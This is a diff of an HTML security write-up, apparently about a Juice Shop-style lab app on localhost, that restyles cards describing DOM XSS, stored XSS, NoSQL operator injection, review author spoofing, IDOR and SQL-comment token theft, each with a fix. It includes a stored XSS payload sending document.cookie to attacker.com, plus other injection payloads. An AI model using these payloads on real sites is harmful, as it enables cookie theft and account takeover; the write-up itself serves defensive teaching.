-                    <div class="exploit-label exploit-bg mb-2">Payload</div>
-                    <pre>http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E</pre>
+            <div class="vuln-body">
+                <div class="vuln-body-inner">
+                    <p class="vuln-prose">This payload makes a full HTTP round trip. The server processes the <code>id</code> parameter and injects it back into the page markup. In this SPA, a reload is required to force the server call.</p>
 
-                    <div class="bg-slate-800/40 rounded-xl p-4">
-                        <p class="text-xs mono text-blue-400 mb-3 font-bold">XSS Comparison</p>
-                        <div class="overflow-x-auto">
-                            <table class="w-full text-xs text-slate-400 mono">
-                                <thead><tr class="text-slate-500 border-b border-slate-700"><th class="text-left py-1 pr-4">Property</th><th class="text-left py-1 pr-4">DOM XSS</th><th class="text-left py-1">Reflected XSS</th></tr></thead>
-                                <tbody>
-                                    <tr class="border-b border-slate-800"><td class="py-1.5 pr-4">Hits server?</td><td class="pr-4 text-red-400">No</td><td class="text-orange-400">Yes</td></tr>
-                                    <tr class="border-b border-slate-800"><td class="py-1.5 pr-4">Indicator</td><td class="pr-4 text-blue-400"># hash</td><td class="text-blue-400">? param</td></tr>
-                                </tbody>
-                            </table>
-                        </div>
+                    <div>
+                        <span class="block-label label-exploit">Payload</span>
+                        <pre>http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E</pre>
                     </div>
 
-                    <div class="exploit-label fix-bg mb-2">Solution</div>
-                    <pre>// Output encode before inserting into HTML
+                    <div class="table-wrap">
+                        <p class="table-title">XSS Variant Comparison</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Property</th>
+                                    <th>DOM XSS</th>
+                                    <th>Reflected XSS</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Hits server?</td>
+                                    <td class="val-no">No</td>
+                                    <td class="val-yes">Yes</td>
+                                </tr>
+                                <tr>
+                                    <td>Indicator</td>
+                                    <td class="val-code"># hash</td>
+                                    <td class="val-code">? param</td>
+                                </tr>
+                                <tr>
+                                    <td>WAF visibility</td>
+                                    <td class="val-no">Blind</td>
+                                    <td class="val-yes">Visible</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div>
+                        <span class="block-label label-fix">Solution</span>
+                        <pre>// Output-encode before inserting into HTML
 const safe = req.query.id
   .replace(/&amp;/g, '&amp;amp;')
   .replace(/&lt;/g, '&amp;lt;')
   .replace(/&gt;/g, '&amp;gt;')</pre>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="xss">
-            <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
-                <div class="flex items-start gap-4">
-                    <div class="dot bg-red-400 mt-1"></div>
+        <!-- 4. Stored XSS -->
+        <div class="vuln-card" data-tags="xss">
+            <div class="vuln-header" onclick="toggleAccordion(this)">
+                <div class="vuln-header-left">
+                    <div class="vuln-dot dot-red"></div>
                     <div>
-                        <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="tag tag-xss">XSS</span>
-                        </div>
-                        <h2 class="text-xl font-bold text-white">Stored XSS via Product API</h2>
-                        <p class="text-slate-500 text-sm mt-1">Payload persists in database — every visitor is a victim</p>
+                        <div class="vuln-tags"><span class="vtag vtag-xss">XSS</span></div>
+                        <h2 class="vuln-title">Stored XSS via Product API</h2>
+                        <p class="vuln-subtitle">Payload persists in the database — every visitor becomes a victim</p>
                     </div>
                 </div>
-                <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
+                <i class="fas fa-chevron-down chevron"></i>
             </div>
-            <div class="accordion-content">
-                <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">By intercepting product updates, malicious payloads are stored in the database. This is a passive attack; once injected, the script executes for any user who views the product, including administrators.</p>
-                    
-                    <div class="exploit-label exploit-bg mb-2">Payload — API Intercept</div>
-                    <pre>"description": "&lt;img src=x onerror='new Image().src=\"https://attacker.com/steal?c=\"+document.cookie'&gt;"</pre>
-                    
-                    <div class="exploit-label fix-bg mb-2">Solution</div>
-                    <pre>// Sanitize on ingest strip HTML at the API layer
+            <div class="vuln-body">
+                <div class="vuln-body-inner">
+                    <p class="vuln-prose">By intercepting product update requests, malicious payloads are stored in the database. This is a passive attack — once injected, the script executes for any user who views the product, including administrators.</p>
+
+                    <div>
+                        <span class="block-label label-exploit">Payload — API Intercept</span>
+                        <pre>"description": "&lt;img src=x onerror='new Image().src=\"https://attacker.com/steal?c=\"+document.cookie'&gt;"</pre>
+                    </div>
+
+                    <div>
+                        <span class="block-label label-fix">Solution</span>
+                        <pre>// Sanitize on ingest — strip HTML at the API layer
 const clean = DOMPurify.sanitize(req.body.description)
 db.product.update({ description: clean })</pre>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="injection">
-            <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
-                <div class="flex items-start gap-4">
-                    <div class="dot bg-orange-400 mt-1"></div>
+        <!-- 5. NoSQL Injection -->
+        <div class="vuln-card" data-tags="injection">
+            <div class="vuln-header" onclick="toggleAccordion(this)">
+                <div class="vuln-header-left">
+                    <div class="vuln-dot dot-orange"></div>
                     <div>
-                        <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="tag tag-injection">Injection</span>
-                        </div>
-                        <h2 class="text-xl font-bold text-white">NoSQL Operator Injection</h2>
-                        <p class="text-slate-500 text-sm mt-1">MongoDB operator injection to modify global reviews</p>
+                        <div class="vuln-tags"><span class="vtag vtag-injection">Injection</span></div>
+                        <h2 class="vuln-title">NoSQL Operator Injection</h2>
+                        <p class="vuln-subtitle">MongoDB operator injection to bulk-modify reviews</p>
                     </div>
                 </div>
-                <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
+                <i class="fas fa-chevron-down chevron"></i>
             </div>
-            <div class="accordion-content">
-                <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">The review update endpoint passes the <code>id</code> directly into a MongoDB query. By providing a JSON object with a <code>$in</code> operator, I could modify multiple reviews simultaneously.</p>
-                    
-                    <div class="exploit-label exploit-bg mb-2">Payload</div>
-                    <pre>{ "id": { "$in": ["ID_1", "ID_2"] }, "message": "hacked" }</pre>
+            <div class="vuln-body">
+                <div class="vuln-body-inner">
+                    <p class="vuln-prose">The review update endpoint passes the <code>id</code> field directly into a MongoDB query. By providing a JSON object with a <code>$in</code> operator instead of a string, I could modify multiple reviews simultaneously across accounts.</p>
 
-                    <div class="exploit-label fix-bg mb-2">Solution</div>
-                    <pre>if (typeof req.body.id !== 'string') {
+                    <div>
+                        <span class="block-label label-exploit">Payload</span>
+                        <pre>{ "id": { "$in": ["ID_1", "ID_2"] }, "message": "hacked" }</pre>
+                    </div>
+
+                    <div>
+                        <span class="block-label label-fix">Solution</span>
+                        <pre>// Reject anything that isn't a plain string
+if (typeof req.body.id !== 'string') {
   return res.status(400).json({ error: 'Invalid id' })
 }</pre>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="access">
-            <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
-                <div class="flex items-start gap-4">
-                    <div class="dot bg-purple-400 mt-1"></div>
+        <!-- 6. Review Spoofing -->
+        <div class="vuln-card" data-tags="access">
+            <div class="vuln-header" onclick="toggleAccordion(this)">
+                <div class="vuln-header-left">
+                    <div class="vuln-dot dot-purple"></div>
                     <div>
-                        <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="tag tag-access">Access Control</span>
-                        </div>
-                        <h2 class="text-xl font-bold text-white">Review Author Spoofing</h2>
-                        <p class="text-slate-500 text-sm mt-1">API trusts client-supplied identity claims</p>
+                        <div class="vuln-tags"><span class="vtag vtag-access">Access Control</span></div>
+                        <h2 class="vuln-title">Review Author Spoofing</h2>
+                        <p class="vuln-subtitle">API trusts client-supplied identity claims</p>
                     </div>
                 </div>
-                <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
+                <i class="fas fa-chevron-down chevron"></i>
             </div>
-            <div class="accordion-content">
-                <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">The server trusts the "author" field in the JSON body. An attacker can impersonate any user by simply providing their email address in the request payload.</p>
-                    
-                    <div class="exploit-label exploit-bg mb-2">Payload</div>
-                    <pre>{"message":"spoofed","author":"victim@juice-sh.op"}</pre>
+            <div class="vuln-body">
+                <div class="vuln-body-inner">
+                    <p class="vuln-prose">The server trusts the <code>author</code> field in the JSON body. An attacker can impersonate any user simply by providing their email address in the request payload — no authentication required beyond being logged in.</p>
 
-                    <div class="exploit-label fix-bg mb-2">Solution</div>
-                    <pre>// Safe — read from verified JWT server side
-const author = req.user.email 
-db.reviews.insert({ message: req.body.message, author: author })</pre>
+                    <div>
+                        <span class="block-label label-exploit">Payload</span>
+                        <pre>{"message":"spoofed review","author":"victim@juice-sh.op"}</pre>
+                    </div>
+
+                    <div>
+                        <span class="block-label label-fix">Solution</span>
+                        <pre>// Read identity from the verified JWT server-side — never from the body
+const author = req.user.email
+db.reviews.insert({ message: req.body.message, author })</pre>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="access">
-            <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
-                <div class="flex items-start gap-4">
-                    <div class="dot bg-purple-400 mt-1"></div>
+        <!-- 7. Insecure Resource Ownership -->
+        <div class="vuln-card" data-tags="access">
+            <div class="vuln-header" onclick="toggleAccordion(this)">
+                <div class="vuln-header-left">
+                    <div class="vuln-dot dot-purple"></div>
                     <div>
-                        <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="tag tag-access">Access Control</span>
-                        </div>
-                        <h2 class="text-xl font-bold text-white">Insecure Resource Ownership</h2>
-                        <p class="text-slate-500 text-sm mt-1">Lack of validation for resource deletion</p>
+                        <div class="vuln-tags"><span class="vtag vtag-access">Access Control</span></div>
+                        <h2 class="vuln-title">Insecure Resource Ownership</h2>
+                        <p class="vuln-subtitle">No ownership check on resource deletion</p>
                     </div>
                 </div>
-                <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
+                <i class="fas fa-chevron-down chevron"></i>
             </div>
-            <div class="accordion-content">
-                <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">While the site uses roles (Admin), it fails to check resource ownership. This allows a user to delete or edit data they do not own.</p>
-                    
-                    <div class="exploit-label fix-bg mb-2">Solution — Ownership Verification</div>
-                    <pre>const review = db.reviews.findOne({ _id: req.params.id })
+            <div class="vuln-body">
+                <div class="vuln-body-inner">
+                    <p class="vuln-prose">While the site enforces roles (Admin vs. user), it fails to verify resource ownership. This allows any authenticated user to delete or edit data belonging to another user — a classic IDOR.</p>
+
+                    <div>
+                        <span class="block-label label-fix">Solution — Ownership Verification</span>
+                        <pre>const review = db.reviews.findOne({ _id: req.params.id })
 if (review.author !== req.user.email) {
   return res.status(403).json({ error: 'Access Denied' })
 }</pre>
+                    </div>
+
+                    <div class="callout callout-neutral">
+                        <strong>Role-based access ≠ ownership-based access.</strong> Roles gate features; ownership gates data. Both must be enforced independently at the resource level.
+                    </div>
                 </div>
             </div>
         </div>
 
-        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="access injection">
-            <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
-                <div class="flex items-start gap-4">
-                    <div class="dot bg-purple-400 mt-1"></div>
+        <!-- 8. JWT Exfiltration -->
+        <div class="vuln-card" data-tags="access injection">
+            <div class="vuln-header" onclick="toggleAccordion(this)">
+                <div class="vuln-header-left">
+                    <div class="vuln-dot dot-purple"></div>
                     <div>
-                        <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="tag tag-access">Access Control</span>
-                            <span class="tag tag-injection">Injection</span>
+                        <div class="vuln-tags">
+                            <span class="vtag vtag-access">Access Control</span>
+                            <span class="vtag vtag-injection">Injection</span>
                         </div>
-                        <h2 class="text-xl font-bold text-white">JWT Exfiltration via Injection</h2>
-                        <p class="text-slate-500 text-sm mt-1">Truncating SQL checks to harvest session tokens</p>
+                        <h2 class="vuln-title">JWT Exfiltration via Injection</h2>
+                        <p class="vuln-subtitle">Truncating SQL checks to harvest session tokens</p>
                     </div>
                 </div>
-                <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
+                <i class="fas fa-chevron-down chevron"></i>
             </div>
-            <div class="accordion-content">
-                <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">By interpolating user input directly into a reset query, the password check can be bypassed using <code>'--</code>. This returns a valid JWT to the attacker, allowing full account takeover.</p>
-                    
-                    <div class="exploit-label fix-bg mb-2">Solution</div>
-                    <p class="text-slate-400 text-sm">Eliminate string interpolation across all authentication and account management endpoints. Trusting any client-supplied identity claim without server-side verification is the root cause across these final 4 vulnerabilities.</p>
+            <div class="vuln-body">
+                <div class="vuln-body-inner">
+                    <p class="vuln-prose">By interpolating user input directly into a password reset query, the check can be bypassed using <code>'--</code>. This returns a valid JWT to the attacker, enabling full account takeover without knowing the target's credentials.</p>
+
+                    <div>
+                        <span class="block-label label-fix">Solution</span>
+                        <pre>// Eliminate string interpolation across ALL auth endpoints
+// Use parameterized queries everywhere
+
+db.query(
+  'SELECT * FROM Users WHERE email = ? AND token = ?',
+  [email, token]
+)</pre>
+                    </div>
+
+                    <div class="callout callout-blue">
+                        <span class="callout-label">Root Cause — Vulnerabilities 6 – 8</span>
+                        Trusting any client-supplied identity claim without server-side verification is the common thread. Whether it's an <code>author</code> field, a resource ID, or a reset token — always derive identity from the verified JWT, never from request body data.
+                    </div>
                 </div>
             </div>
         </div>
 
     </main>
 
+    <footer>
+        <span class="footer-logo">Harshith Suresh</span>
+        <p>Security writeup · March 2026</p>
+    </footer>
+
     <script>
-        function toggleAccordion(element) {
-            const content = element.nextElementSibling;
-            const chevron = element.querySelector('.chevron');
-            content.classList.toggle('open');
+        function toggleAccordion(header) {
+            const body = header.nextElementSibling;
+            const chevron = header.querySelector('.chevron');
+            body.classList.toggle('open');
             chevron.classList.toggle('open');
         }
 
         function filterCards(tag, btn) {
-            document.querySelectorAll('.tag').forEach(t => t.classList.remove('active'));
-            btn.classList.add('active');
-            
-            const cards = document.querySelectorAll('.challenge-card');
-            cards.forEach(card => {
-                if (tag === 'all' || card.getAttribute('data-tags').includes(tag)) {
+            document.querySelectorAll('.filter-tag').forEach(t => {
+                t.className = 'filter-tag';
+            });
+            btn.classList.add('active-' + tag);
+
+            document.querySelectorAll('.vuln-card').forEach(card => {
+                const tags = card.getAttribute('data-tags');
+                if (tag === 'all' || tags.includes(tag)) {
                     card.classList.remove('hidden');
                 } else {
                     card.classList.add('hidden');
